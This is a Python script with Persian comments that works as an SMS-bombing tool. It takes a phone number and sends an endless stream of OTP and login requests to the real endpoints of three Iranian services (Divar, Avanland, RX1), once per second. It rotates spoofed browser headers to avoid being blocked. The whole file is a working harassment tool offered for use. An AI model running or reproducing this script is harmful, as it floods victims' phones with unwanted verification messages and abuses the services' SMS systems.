import requests
import re
import time
from colorama import Fore, Style, init

init(autoreset=True)  # برای بازنشانی خودکار رنگ‌ها بعد از هر چاپ

headers_list = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
        "Accept": "*/*"
    },
    {
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
        "Accept": "*/*"
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
        'Accept': '*/*'
    },
    {
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
        "Accept": '*/*'
    }
]

def get_next_header(index):
    """
    دریافت هدر بعدی از لیست هدرها با استفاده از ایندکس داده شده.
    """
    return headers_list[index % len(headers_list)]

def is_valid_phone_number(number):
    """
    اعتبارسنجی شماره تلفن.
    یک شماره تلفن معتبر باید فقط حاوی اعداد باشد و طول آن 11 رقم باشد و با 0 شروع شود.
    """
    return re.fullmatch(r'0\d{10}', number) is not None

def send_auth_request_divar(phone_number, headers):
    """
    ارسال درخواست احراز هویت به URL مشخص شده با شماره تلفن داده شده.
    """
    url_divar = "https://api.divar.ir/v5/auth/authenticate"
    json_divar = {"phone": phone_number}
    
    try:
        req = requests.post(url=url_divar, json=json_divar, headers=headers)
        req.raise_for_status()  # بررسی موفقیت‌آمیز بودن درخواست
        print(f"{Fore.GREEN}Divar: Request sent successfully with header: {headers}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Divar: Failed to send the request. Error: {e}")
        return False

def send_auth_request_avanland(phone_number, headers):
    """
    ارسال درخواست احراز هویت به URL مشخص شده با شماره تلفن داده شده برای Avanland.
    """
    url_avanland = "https://avanland.com/wp-content/plugins/digi-style-login/include/custom-ajax-handler/ajax.php"
    data_avanland = {
        "action": "verify_user_login",
        "fast_ajax": "true",
        "user": phone_number,
        "duty": "send_otp_to_user"
    }

    try:
        req = requests.post(url=url_avanland, data=data_avanland, headers=headers)
        req.raise_for_status()  # بررسی موفقیت‌آمیز بودن درخواست
        print(f"{Fore.GREEN}Avanland: Request sent successfully with header: {headers}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Avanland: Failed to send the request. Error: {e}")
        return False

def send_auth_request_rx1(phone_number, headers):
    """
    ارسال درخواست احراز هویت به URL مشخص شده با شماره تلفن داده شده برای RX1.
    """
    url_rx1 = "https://rx1.ir/wp-admin/admin-ajax.php"
    data_rx1 = {
        "action": "digits_check_mob",
        "countrycode": "+98",
        "mobileNo": phone_number
    }

    try:
        req = requests.post(url=url_rx1, data=data_rx1, headers=headers)
        req.raise_for_status()  # بررسی موفقیت‌آمیز بودن درخواست
        print(f"{Fore.GREEN}RX1: Request sent successfully with header: {headers}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}RX1: Failed to send the request. Error: {e}")
        return False

def main():
    """
    تابع اصلی برای دریافت ورودی کاربر و ارسال درخواست احراز هویت به صورت رگباری.
    """
    developer_name = "SAFA"
    version = "1.0.0"
    print(f"{Fore.CYAN}Developer: {developer_name}")
    print(f"{Fore.WHITE}Version: {version}")

    index = 0  # شمارنده برای پیگیری هدرها

    while True:
        number = input(f"{Fore.YELLOW}Enter Your Phone number (with leading 0): ")

        if is_valid_phone_number(number):
            print("Phone number is valid.")  # پیام تایید معتبر بودن شماره تلفن
            while True:  # حلقه بی‌نهایت برای ارسال درخواست‌ها به صورت رگباری
                headers = get_next_header(index)
                index += 1
                
                send_auth_request_divar(number, headers)
                send_auth_request_avanland(number, headers)
                send_auth_request_rx1(number, headers)
                
                time.sleep(1)  # اضافه کردن تاخیر برای جلوگیری از بار زیاد بر روی سرورها
        else:
            print("Invalid phone number. Please enter an 11-digit number with leading 0.")

if __name__ == "__main__":
    main()
